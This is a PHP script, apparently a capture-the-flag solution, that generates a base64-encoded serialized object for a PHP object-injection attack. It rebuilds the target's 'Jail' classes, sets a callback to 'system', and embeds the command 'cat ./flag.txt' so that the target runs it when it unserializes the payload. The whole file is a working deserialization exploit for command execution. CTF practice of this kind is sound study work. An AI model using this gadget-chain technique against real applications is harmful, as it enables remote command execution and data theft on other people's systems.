#!/usr/bin/php
<?php

namespace Jail {
  class Caster
  {
    public $cb = 'system';
  }

  class Cat
  {
    protected $magic;
    protected $spell;
    function __construct($spell)
    {
      $this->magic = new Caster();
      $this->spell = $spell;
    }
  }

  class Magic
  {
    function cast($spell)
    {
      echo "MAGIC, $spell!";
    }
  }
}

namespace {
  $o = new \Jail\Cat('cat ./flag.txt');
  echo base64_encode(serialize($o));

}


